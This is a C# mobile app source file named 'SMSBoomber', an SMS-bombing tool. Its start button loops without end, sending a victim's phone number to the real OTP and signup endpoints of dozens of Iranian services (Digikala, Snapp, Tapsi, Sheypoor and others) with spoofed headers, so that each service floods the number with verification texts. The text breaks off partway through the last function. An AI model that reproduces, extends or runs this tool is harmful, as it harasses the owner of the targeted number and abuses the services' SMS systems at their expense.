using System.Text;

namespace SMSBoomber
{
    public partial class MainPage : ContentPage
    {

        public MainPage()
        {
            InitializeComponent();
        }

        private async void Button_Clicked(object sender, EventArgs e)
        {
            Application.Current.MainPage.DisplayAlert("Warning", "App Start", "ok");
            // start btn
            string number = fieldNumber.Text;
            try
            {
                int count_req = 0;
                while (number != "")
                {
                    lblStatus.Text = "Wait...";
                    await websiteApi.alibaba(number);
                    await websiteApi.alopeyk_login(number);
                    await websiteApi.alopeyk_signup(number);
                    count_req+=3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.azki(number);
                    await websiteApi.banimode(number);
                    await websiteApi.bargheman(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.classino(number);
                    await websiteApi.digikala(number);
                    await websiteApi.digikala_jet(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.digistyle(number);
                    await websiteApi.drdr(number);
                    await websiteApi.drnext(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.emalls(number, "E2LM");
                    await websiteApi.ghabzino(number);
                    await websiteApi.jabama(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.khanoumi(number);
                    await websiteApi.komodaa(number);
                    await websiteApi.miare(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.mobit(number);
                    await websiteApi.namava(number);
                    await websiteApi.nobatir(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.ostadkar(number);
                    await websiteApi.payamakapi(number);
                    await websiteApi.pinorest(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.shahrefarsh(number);
                    await websiteApi.sheypoor(number);
                    await websiteApi.snapp_drivers(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.snapp_express(number);
                    await websiteApi.taaghche_login(number);
                    await websiteApi.taaghche_signup(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.takshopaccessorise(number);
                    await websiteApi.tapsi_drivers(number);
                    await websiteApi.tapsi_passenger(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                    await websiteApi.tetherland(number);
                    await websiteApi.torob(number);
                    await websiteApi.vandar(number);
                    count_req += 3;
                    lblStatus.Text = count_req + " Sent";
                }

            }
            catch (Exception)
            {

                throw;
            }
        }

        private void Button_Clicked_1(object sender, EventArgs e)
        {
            //stop btn

            Application.Current.Quit();
        }
    }
    public class websiteApi
    {
        public static async Task sheypoor(string phoneNumber)
        {
            var url = "https://www.sheypoor.com/api/v10.0.0/auth/send";
            var json = $"{{\"username\":\"{phoneNumber}\"}}";

            var handler = new HttpClientHandler()
            {
                Proxy = null,
                UseProxy = false
            };

            using (var httpClient = new HttpClient(handler))
            {
                httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");

                var content = new StringContent(json, Encoding.UTF8, "application/json");

                try
                {
                    var response = await httpClient.PostAsync(url, content);
                    string result = await response.Content.ReadAsStringAsync();

                    //Console.WriteLine($"Status: {response.StatusCode}");
                    //Console.WriteLine("Response:");
                    //Console.WriteLine(result);
                }
                catch (Exception ex)
                {
                    //Console.WriteLine("❌ Error sending request: " + ex.Message);
                }
            }
        }
        public static async Task digikala(string phoneNumber)
        {


            var url = "https://api.digikala.com/v1/user/authenticate/";
            var json = $@"
            {{
                ""backUrl"": ""/"",
                ""username"": ""{phoneNumber}"",
                ""otp_call"": false,
                ""hash"": null
            }}";

            var handler = new HttpClientHandler()
            {
                Proxy = null,
                UseProxy = false
            };

            using (var httpClient = new HttpClient(handler))
            {
                httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");

                var content = new StringContent(json, Encoding.UTF8, "application/json");

                try
                {
                    var response = await httpClient.PostAsync(url, content);
                    var result = await response.Content.ReadAsStringAsync();

                    //Console.WriteLine($"Status: {response.StatusCode}");
                    //Console.WriteLine("Response:");
                    //Console.WriteLine(result);
                }
                catch (Exception ex)
                {
                    //Console.WriteLine("❌ Error sending request: " + ex.Message);
                }
            }
        }
        public static async Task torob(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = $"https://api.torob.com/v4/user/phone/send-pin/?phone_number={phoneNumber}&source=next_desktop";
            try
            {
                var response = await httpClient.GetAsync(url);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Torob] Status: {response.StatusCode}");
                Console.WriteLine("[Torob] Response:");
                Console.WriteLine(result);
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine("❌ [Torob] Network Error: " + ex.ToString());
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Torob] Error sending request: " + ex.ToString());
            }
        }
        public static async Task khanoumi(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://accounts.khanoumi.com/account/login/init";

            var form = new MultipartFormDataContent();
            form.Add(new StringContent("b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e"), "applicationId");
            form.Add(new StringContent(phoneNumber), "loginIdentifier");
            form.Add(new StringContent("sms"), "loginSchemeName");

            try
            {
                var response = await httpClient.PostAsync(url, form);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Khanoumi] Status: {response.StatusCode}");
                Console.WriteLine("[Khanoumi] Response:");
                Console.WriteLine(result);
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine("❌ [Khanoumi] Network Error: " + ex.ToString());
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Khanoumi] Error sending request: " + ex.ToString());
            }
        }
        public static async Task emalls(string phoneNumber, string captchaCode)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://emalls.ir/swservice/register.ashx";

            var form = new MultipartFormDataContent();
            form.Add(new StringContent("1"), "step");
            form.Add(new StringContent(phoneNumber), "emailmobile");
            form.Add(new StringContent(captchaCode), "captchacode");

            try
            {
                var response = await httpClient.PostAsync(url, form);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Emalls] Status: {response.StatusCode}");
                Console.WriteLine("[Emalls] Response:");
                Console.WriteLine(result);
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine("❌ [Emalls] Network Error: " + ex.ToString());
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Emalls] Error sending request: " + ex.ToString());
            }
        }
        public static async Task payamakapi(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = $"https://rest.payamakapi.ir/api/v1/User/SmsTestNumber?number={phoneNumber}";
            try
            {
                var response = await httpClient.PostAsync(url, null);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[PayamakAPI] Status: {response.StatusCode}");
                Console.WriteLine("[PayamakAPI] Response:");
                Console.WriteLine(result);
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine("❌ [PayamakAPI] Network Error: " + ex.ToString());
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [PayamakAPI] Error sending request: " + ex.ToString());
            }
        }
        public static async Task namava(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request";
            var json = $"{{\"UserName\":\"+98{phoneNumber.Substring(1)}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Namava] Status: {response.StatusCode}");
                Console.WriteLine("[Namava] Response:");
                Console.WriteLine(result);
            }
            catch (HttpRequestException ex)
            {
                Console.WriteLine("❌ [Namava] Network Error: " + ex.ToString());
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Namava] Error sending request: " + ex.ToString());
            }
        }
        public static async Task nobatir(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://nobat.ir/api/public/patient/login/phone";
            var form = new MultipartFormDataContent("----WebKitFormBoundary5wscOwxMqnICoiZY");
            form.Add(new StringContent(phoneNumber), "mobile");
            try
            {
                var response = await httpClient.PostAsync(url, form);
                // اگر Console.WriteLine نمی‌خواهی، این خط را حذف کن
                // string result = await response.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                // اگر Console.WriteLine نمی‌خواهی، این خط را حذف کن
            }
        }
        public static async Task takshopaccessorise(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://takshopaccessorise.ir/api/v1/sessions/login_request";
            var json = $"{{\"mobile_phone\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");
            content.Headers.ContentType.CharSet = "UTF-8";
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Takshopaccessorise] Status: {response.StatusCode}");
                Console.WriteLine("[Takshopaccessorise] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Takshopaccessorise] Error: " + ex.ToString());
            }
        }
        public static async Task classino(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://student.classino.com/otp/v1/api/login";
            var json = $"{{\"mobile\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Classino] Status: {response.StatusCode}");
                Console.WriteLine("[Classino] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Classino] Error: " + ex.ToString());
            }
        }
        public static async Task drnext(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token";
            var json = $"{{\"source\":\"besina\",\"mobile\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[DrNext] Status: {response.StatusCode}");
                Console.WriteLine("[DrNext] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [DrNext] Error: " + ex.ToString());
            }
        }
        public static async Task alibaba(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://ws.alibaba.ir/api/v3/account/mobile/otp";
            var json = $"{{\"phoneNumber\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Alibaba] Status: {response.StatusCode}");
                Console.WriteLine("[Alibaba] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Alibaba] Error: " + ex.ToString());
            }
        }
        public static async Task tetherland(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://service.tetherland.com/api/v5/login-register";
            var json = $"{{\"mobile\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Tetherland] Status: {response.StatusCode}");
                Console.WriteLine("[Tetherland] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Tetherland] Error: " + ex.ToString());
            }
        }
        public static async Task pinorest(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.pinorest.com/frontend/auth/login/mobile";
            var json = $"{{\"mobile\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Pinorest] Status: {response.StatusCode}");
                Console.WriteLine("[Pinorest] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Pinorest] Error: " + ex.ToString());
            }
        }
        public static async Task jabama(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://taraazws.jabama.com/api/v4/account/send-code";
            var json = $"{{\"mobile\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Jabama] Status: {response.StatusCode}");
                Console.WriteLine("[Jabama] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Jabama] Error: " + ex.ToString());
            }
        }
        public static async Task mobit(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.mobit.ir/api/web/v8/register/register";
            var json = $"{{\"number\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");
            content.Headers.ContentType.CharSet = "UTF-8";
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Mobit] Status: {response.StatusCode}");
                Console.WriteLine("[Mobit] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Mobit] Error: " + ex.ToString());
            }
        }
        public static async Task vandar(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.vandar.io/account/v1/check/mobile";
            var json = $"{{\"mobile\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Vandar] Status: {response.StatusCode}");
                Console.WriteLine("[Vandar] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Vandar] Error: " + ex.ToString());
            }
        }
        public static async Task bargheman(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://uiapi2.saapa.ir/api/otp/sendCode";
            var json = $"{{\"mobile\":\"{phoneNumber}\",\"from_meter_buy\":false}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Bargheman] Status: {response.StatusCode}");
                Console.WriteLine("[Bargheman] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Bargheman] Error: " + ex.ToString());
            }
        }
        public static async Task ghabzino(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode";
            var json = $"{{\"Parameters\":{{\"ApplicationType\":\"Web\",\"ApplicationUniqueToken\":null,\"ApplicationVersion\":\"1.0.0\",\"MobileNumber\":\"{phoneNumber}\",\"UniqueToken\":null}}}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Ghabzino] Status: {response.StatusCode}");
                Console.WriteLine("[Ghabzino] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Ghabzino] Error: " + ex.ToString());
            }
        }
        public static async Task komodaa(string phoneNumber)

        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.komodaa.com/api/v2.6/loginRC/request";
            var json = $"{{\"phone_number\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Komodaa] Status: {response.StatusCode}");
                Console.WriteLine("[Komodaa] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Komodaa] Error: " + ex.ToString());
            }
        }
        public static async Task taaghche_signup(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://gw.taaghche.com/v4/site/auth/signup";
            var json = $"{{\"contact\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[TaaghcheSignup] Status: {response.StatusCode}");
                Console.WriteLine("[TaaghcheSignup] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [TaaghcheSignup] Error: " + ex.ToString());
            }
        }
        public static async Task banimode(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://mobapi.banimode.com/api/v2/auth/request";
            var json = $"{{\"phone\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");
            content.Headers.ContentType.CharSet = "UTF-8";
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Banimode] Status: {response.StatusCode}");
                Console.WriteLine("[Banimode] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Banimode] Error: " + ex.ToString());
            }
        }
        public static async Task drdr(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            httpClient.DefaultRequestHeaders.Add("client-id", "f60d5037-b7ac-404a-9e3a-a263fd9f8054");
            var url = "https://drdr.ir/api/v3/auth/login/mobile/init";
            var json = $"{{\"mobile\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[DrDr] Status: {response.StatusCode}");
                Console.WriteLine("[DrDr] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [DrDr] Error: " + ex.ToString());
            }
        }
        public static async Task taaghche_login(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://gw.taaghche.com/v4/site/auth/login";
            var json = $"{{\"contact\":\"{phoneNumber}\",\"forceOtp\":false}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[TaaghcheLogin] Status: {response.StatusCode}");
                Console.WriteLine("[TaaghcheLogin] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [TaaghcheLogin] Error: " + ex.ToString());
            }
        }
        public static async Task miare(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://www.miare.ir/api/otp/driver/request/";
            var json = $"{{\"phone_number\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");
            content.Headers.ContentType.CharSet = "UTF-8";
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Miare] Status: {response.StatusCode}");
                Console.WriteLine("[Miare] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Miare] Error: " + ex.ToString());
            }
        }
        public static async Task tapsi_drivers(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.tapsi.ir/api/v2.2/user";
            var json = $"{{\"credential\":{{\"phoneNumber\":\"{phoneNumber}\",\"role\":\"DRIVER\"}},\"otpOption\":\"SMS\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[TapsiDrivers] Status: {response.StatusCode}");
                Console.WriteLine("[TapsiDrivers] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [TapsiDrivers] Error: " + ex.ToString());
            }
        }
        public static async Task tapsi_passenger(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.tapsi.ir/api/v2.2/user";
            var json = $"{{\"credential\":{{\"phoneNumber\":\"{phoneNumber}\",\"role\":\"PASSENGER\"}},\"otpOption\":\"SMS\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[TapsiPassenger] Status: {response.StatusCode}");
                Console.WriteLine("[TapsiPassenger] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [TapsiPassenger] Error: " + ex.ToString());
            }
        }
        public static async Task digikala_jet(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.digikalajet.ir/user/login-register/";
            var json = $"{{\"phone\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[DigikalaJet] Status: {response.StatusCode}");
                Console.WriteLine("[DigikalaJet] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [DigikalaJet] Error: " + ex.ToString());
            }
        }
        public static async Task snapp_drivers(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=";
            var json = $"{{\"cellphone\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[SnappDrivers] Status: {response.StatusCode}");
                Console.WriteLine("[SnappDrivers] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [SnappDrivers] Error: " + ex.ToString());
            }
        }
        public static async Task ostadkar(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.ostadkr.com/login";
            var json = $"{{\"mobile\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Ostadkar] Status: {response.StatusCode}");
                Console.WriteLine("[Ostadkar] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Ostadkar] Error: " + ex.ToString());
            }
        }
        public static async Task digistyle(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://www.digistyle.com/users/login-register/";
            var content = new StringContent($"loginRegister%5Bemail_phone%5D={phoneNumber}", Encoding.UTF8, "application/x-www-form-urlencoded");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Digistyle] Status: {response.StatusCode}");
                Console.WriteLine("[Digistyle] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Digistyle] Error: " + ex.ToString());
            }
        }
        public static async Task snapp_express(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b";
            var content = new StringContent($"cellphone={phoneNumber}&captcha=&optionalLoginToken=true&local=", Encoding.UTF8, "application/x-www-form-urlencoded");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[SnappExpress] Status: {response.StatusCode}");
                Console.WriteLine("[SnappExpress] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [SnappExpress] Error: " + ex.ToString());
            }
        }
        public static async Task azki(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            httpClient.DefaultRequestHeaders.Add("deviceid", "6");
            var url = "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/";
            var json = $"{{\"phoneNumber\":\"{phoneNumber}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Azki] Status: {response.StatusCode}");
                Console.WriteLine("[Azki] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [Azki] Error: " + ex.ToString());
            }
        }
        public static async Task alopeyk_login(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.alopeyk.com/api/v2/login?platform=pwa";
            // حذف صفر اول شماره برای شبیه‌سازی تبدیل به int در PHP
            var phoneInt = phoneNumber.StartsWith("0") ? phoneNumber.Substring(1) : phoneNumber;
            var json = $"{{\"type\":\"CUSTOMER\",\"model\":\"Chrome 111.0.0.0\",\"platform\":\"pwa\",\"version\":\"10\",\"manufacturer\":\"Windows\",\"isVirtual\":false,\"serial\":true,\"app_version\":\"1.2.9\",\"uuid\":true,\"phone\":\" {phoneInt}\"}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[AlopeykLogin] Status: {response.StatusCode}");
                Console.WriteLine("[AlopeykLogin] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [AlopeykLogin] Error: " + ex.ToString());
            }
        }
        public static async Task alopeyk_signup(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://api.alopeyk.com/api/v2/register-customer?platform=pwa";
            var json = $"{{\"type\":\"CUSTOMER\",\"model\":\"Chrome 111.0.0.0\",\"platform\":\"pwa\",\"version\":\"10\",\"manufacturer\":\"Windows\",\"isVirtual\":false,\"serial\":true,\"app_version\":\"1.2.9\",\"uuid\":true,\"firstname\":\"تست\",\"lastname\":\"تست\",\"phone\":\"{phoneNumber}\",\"email\":\"\",\"referred_by\":\"\",\"lat\":null,\"lng\":null}}";
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[AlopeykSignup] Status: {response.StatusCode}");
                Console.WriteLine("[AlopeykSignup] Response:");
                Console.WriteLine(result);
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ [AlopeykSignup] Error: " + ex.ToString());
            }
        }
        public static async Task shahrefarsh(string phoneNumber)
        {
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            var url = "https://shahrfarsh.com/Account/Login";
            var content = new StringContent($"phoneNumber={phoneNumber}", Encoding.UTF8, "application/x-www-form-urlencoded");
            try
            {
                var response = await httpClient.PostAsync(url, content);
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[Shahrefarsh] Status: {response.StatusCode}");
